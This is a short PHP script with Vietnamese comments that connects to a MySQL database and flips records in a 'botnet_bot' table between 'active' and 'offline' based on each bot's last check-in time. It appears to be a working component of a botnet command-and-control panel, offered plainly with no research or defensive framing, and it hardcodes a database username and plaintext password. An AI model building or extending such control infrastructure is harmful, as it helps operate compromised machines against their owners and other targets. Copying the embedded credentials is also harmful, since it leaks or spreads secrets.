<?php

$servername = "localhost";
$username = "ailurophile"; // thay đổi với username của bạn
$password = "Dinokulz123."; // thay đổi với mật khẩu của bạn
$dbname = "ailurophile"; // thay đổi với tên database của bạn

try {
    $pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Kết nối thất bại: " . $e->getMessage());
}

// Cập nhật các bot có last_time_connect quá 30 giây thành "offline"
$stmt = $pdo->prepare("UPDATE botnet_bot SET status = 'offline' WHERE status = 'active' AND TIMESTAMPDIFF(SECOND, last_time_connect, NOW()) > 30");
$stmt->execute();

// Cập nhật các bot có last_time_connect nhỏ hơn 30 giây thành "active"
$stmt = $pdo->prepare("UPDATE botnet_bot SET status = 'active' WHERE status = 'offline' AND TIMESTAMPDIFF(SECOND, last_time_connect, NOW()) <= 30");
$stmt->execute();

echo "Updated bot statuses based on last connection time.";